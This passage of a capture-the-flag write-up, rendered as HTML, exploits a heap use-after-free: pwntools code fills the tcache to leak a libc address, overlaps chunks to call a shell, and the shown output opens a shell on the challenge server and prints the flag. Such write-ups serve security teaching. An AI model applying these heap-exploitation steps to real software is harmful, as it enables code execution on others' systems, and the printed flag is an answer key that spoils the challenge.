+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/30gx 0x21a0260-0x10
+</span></span><span style="display:flex;"><span>0x21a0250:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0260:	0x6161616161616161	0x616161616161610a
+</span></span><span style="display:flex;"><span>0x21a0270:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0280:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a0290:	0x6161616161616161	0x000000000000000a &lt;- student_pointer
+</span></span><span style="display:flex;"><span>0x21a02a0:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a02b0:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a02c0:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a02d0:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a02e0:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a02f0:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0300:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a0310:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0320:	0x6161616161616161	0x000000000000000a
+</span></span><span style="display:flex;"><span>0x21a0330:	0x0000000000000000	0x0000000000020cd1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="leak-libc-base-address">Leak libc base address <a href="#leak-libc-base-address" class="anchor">#</a></h4>
+<p>Now we have a pointer to our fake chunk, we are ready to leak the libc address of <code>main_arena</code>. We just need to free it 7 times (to fulfill <code>tcache[0x90]</code> bin), and then free it one more time, to make our chunk as the cache of unsorted bin.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">7</span>):
+</span></span><span style="display:flex;"><span>    free_student() <span style="color:#09f;font-style:italic"># Free it 7 times to fulfill tcache[0x90]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Because tcache[0x90] is full, the next free will put the cached chunk into unsorted bins</span>
+</span></span><span style="display:flex;"><span>free_student() <span style="color:#09f;font-style:italic"># Cache goes to unsorted bins, and its pointer will point to the main_arena</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now our pointer is pointing to the main_arena. We can leak the libc address by using the print menu,</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># because the student variable is still a pointer to the freed chunk</span>
+</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> print_student()
+</span></span><span style="display:flex;"><span>main_arena <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;main_arena&#39;</span>]
+</span></span><span style="display:flex;"><span>libc_leaked <span style="color:#555">=</span> u64(out<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>)) <span style="color:#09f;font-style:italic"># We got main_arena+0x60</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> libc_leaked <span style="color:#555">-</span> main_arena <span style="color:#555">-</span> <span style="color:#f60">0x60</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leak libc base address: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Bins and Heap structure before the 8th free:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; bins
+</span></span><span style="display:flex;"><span>tcachebins
+</span></span><span style="display:flex;"><span>0x90 <span style="color:#555">[</span>  7<span style="color:#555">]</span>: 0x21a0290 ◂— 0x21a0290
+</span></span><span style="display:flex;"><span>fastbins
+</span></span><span style="display:flex;"><span>0x20: 0x0
+</span></span><span style="display:flex;"><span>0x30: 0x0
+</span></span><span style="display:flex;"><span>0x40: 0x0
+</span></span><span style="display:flex;"><span>0x50: 0x0
+</span></span><span style="display:flex;"><span>0x60: 0x0
+</span></span><span style="display:flex;"><span>0x70: 0x0
+</span></span><span style="display:flex;"><span>0x80: 0x0
+</span></span><span style="display:flex;"><span>unsortedbin
+</span></span><span style="display:flex;"><span>all: 0x0
+</span></span><span style="display:flex;"><span>smallbins
+</span></span><span style="display:flex;"><span>empty
+</span></span><span style="display:flex;"><span>largebins
+</span></span><span style="display:flex;"><span>empty
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/30gx 0x21a0260-0x10
+</span></span><span style="display:flex;"><span>0x21a0250:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0260:	0x6161616161616161	0x616161616161610a
+</span></span><span style="display:flex;"><span>0x21a0270:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0280:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a0290:	0x00000000021a0290	0x000000000000000a &lt;- student_pointer pointed address
+</span></span><span style="display:flex;"><span>0x21a02a0:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a02b0:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a02c0:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a02d0:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a02e0:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a02f0:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0300:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a0310:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0320:	0x6161616161616161	0x000000000000000a
+</span></span><span style="display:flex;"><span>0x21a0330:	0x0000000000000000	0x0000000000020cd1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After the 8th free:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; bins
+</span></span><span style="display:flex;"><span>tcachebins
+</span></span><span style="display:flex;"><span>0x90 <span style="color:#555">[</span>  7<span style="color:#555">]</span>: 0x21a0290 —▸ 0x7f7bd939aca0 <span style="color:#555">(</span>main_arena+96<span style="color:#555">)</span> —▸ 0x21a0330 ◂— 0x0
+</span></span><span style="display:flex;"><span>fastbins
+</span></span><span style="display:flex;"><span>0x20: 0x0
+</span></span><span style="display:flex;"><span>0x30: 0x0
+</span></span><span style="display:flex;"><span>0x40: 0x0
+</span></span><span style="display:flex;"><span>0x50: 0x0
+</span></span><span style="display:flex;"><span>0x60: 0x0
+</span></span><span style="display:flex;"><span>0x70: 0x0
+</span></span><span style="display:flex;"><span>0x80: 0x0
+</span></span><span style="display:flex;"><span>unsortedbin
+</span></span><span style="display:flex;"><span>all: 0x21a0280 —▸ 0x7f7bd939aca0 <span style="color:#555">(</span>main_arena+96<span style="color:#555">)</span> ◂— 0x21a0280
+</span></span><span style="display:flex;"><span>smallbins
+</span></span><span style="display:flex;"><span>empty
+</span></span><span style="display:flex;"><span>largebins
+</span></span><span style="display:flex;"><span>empty
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/30gx 0x21a0260-0x10
+</span></span><span style="display:flex;"><span>0x21a0250:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0260:	0x6161616161616161	0x616161616161610a
+</span></span><span style="display:flex;"><span>0x21a0270:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0280:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a0290:	0x00007f7bd939aca0	0x00007f7bd939aca0 &lt;- student_pointer pointed address and now its contains libc address of the main_arena
+</span></span><span style="display:flex;"><span>0x21a02a0:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a02b0:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a02c0:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a02d0:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a02e0:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a02f0:	0x0000000000000000	0x0000000000000021
+</span></span><span style="display:flex;"><span>0x21a0300:	0x0000000000000000	0x0000000000000091
+</span></span><span style="display:flex;"><span>0x21a0310:	0x0000000000000090	0x0000000000000020
+</span></span><span style="display:flex;"><span>0x21a0320:	0x6161616161616161	0x000000000000000a
+</span></span><span style="display:flex;"><span>0x21a0330:	0x0000000000000000	0x0000000000020cd1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With UAF, simply print the student info, and because the student pointer is currently pointing to the leaked libc, it will print the libc address. We finally got the leaked libc address.</p>
+<h4 id="final-step">Final step <a href="#final-step" class="anchor">#</a></h4>
+<p>After that, we can reuse the first pitfall solution, but instead of putting the <code>getFlag</code> address, we put our shell_address ready to be executed</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>shell_addr <span style="color:#555">=</span> libc_base <span style="color:#555">+</span> libc_shell
+</span></span><span style="display:flex;"><span>new_admin() <span style="color:#09f;font-style:italic"># Create new admin</span>
+</span></span><span style="display:flex;"><span>free_admin() <span style="color:#09f;font-style:italic"># Free it</span>
+</span></span><span style="display:flex;"><span>new_student(p64(<span style="color:#f60">0</span>)<span style="color:#555">+</span>p64(shell_addr)) <span style="color:#09f;font-style:italic"># Create new student</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Because of the tcache, now variable admin and student are pointing to the same chunk,</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># and the chunk data (last 8 bytes) that can be called by the admin is our shell_addr</span>
+</span></span><span style="display:flex;"><span>get_shell()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Executing the full solution will give us shell and we can read the real flag.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span><span style="display:flex;"><span>[+] Opening connection to 35.246.134.224 on port 30532: Done
+</span></span><span style="display:flex;"><span>[*] Leak heap address: 0x1de0260
+</span></span><span style="display:flex;"><span>[*] Leak libc base address: 0x7f8af6ff1000
+</span></span><span style="display:flex;"><span>[*] Switching to interactive mode
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>flag.txt  ld-2.27.so  libc.so.6  real_flag.txt    vuln  vuln.c
+</span></span><span style="display:flex;"><span>$ cat real_flag.txt
+</span></span><span style="display:flex;"><span>CTF{ab7bdaa3e5ed17ed326fef624a2d95d6ea62caa3dba6d1e5493936c362eed40e}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Flag: CTF{ab7bdaa3e5ed17ed326fef624a2d95d6ea62caa3dba6d1e5493936c362eed40e}</p>
+</blockquote>
+<h3 id="full-solution">Full Solution <a href="#full-solution" class="anchor">#</a></h3>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
